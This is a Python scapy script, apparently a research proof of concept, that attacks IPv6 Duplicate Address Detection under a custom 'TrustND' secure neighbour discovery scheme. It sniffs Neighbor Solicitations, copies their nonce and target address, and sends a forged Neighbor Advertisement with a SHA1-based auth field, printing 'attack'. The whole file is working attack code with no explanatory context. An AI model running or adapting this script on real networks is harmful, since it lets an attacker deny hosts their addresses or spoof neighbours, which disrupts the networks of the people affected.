from __future__ import print_function
from scapy.all import *
import random
import hashlib

class DadReply:
    flag=True
    nonce=""
    i=0
    trustND=''

    def parseIp(self, ip):
        self.strIP = ip.replace(":", "")
        self.snma = self.strIP[-6:]
        self.suffix = self.strIP[:26]
        print(self.snma, self.strIP, self.suffix)
        return [self.snma, self.strIP, self.suffix]

    def sendNa(self,ip):

        snma, ipWithoutColon, suffix = self.parseIp(ip)

        l2 = Ether(src="00:0c:29:ba:4c:2a", dst='33:33:ff:' + snma[:2] + ':' + snma[2:4] + ':' + snma[4:])
        l3 = IPv6(src=ip, dst='ff02::1:ff:' + snma[:2] + ':' + snma[2:])
        na = ICMPv6ND_NA(tgt=ip)

        trustND = ICMPv6NDOptTrustND()
        self.timestamp = trustND.timestamp = int(time.time())
        trustND.nonce = int(self.nonce)

        auth = self.hashSha1(l3/na/trustND)

        trustND.auth = auth

        print("sending NA packet with DADmatch option")
        p = l2/l3/na/trustND

        p.display()
        sendp(p, iface="lo")


    def verifingNS(self, packet):
        if IPv6 in packet[0][1]:
            ipv6 = packet[0][1][IPv6]
            if ICMPv6ND_NS in ipv6:
                ns = ipv6[ICMPv6ND_NS]
                if ICMPv6NDOptTrustND in ns:
                    self.i=self.i+1
                    if self.i % 2 == 0: return 0
                    trustND = ns[ICMPv6NDOptTrustND]
                    self.nonce = trustND.nonce
                    self.ip= ns.tgt
                    print("attack")
                    self.flag = False
                    self.sendNa(self.ip)
                else:
                    print("Received DAD but it does not has trust ND tag option")


    def hashSha1(self,p):
        sha1 = hashlib.sha1()
        sha1.update(str(p))
        hash = sha1.hexdigest()
        hashHex = hash.decode("hex")
        return hashHex

    def sniffingAndReply(self):
        print("Replay DAD is starting")
        sniff(prn=self.verifingNS)

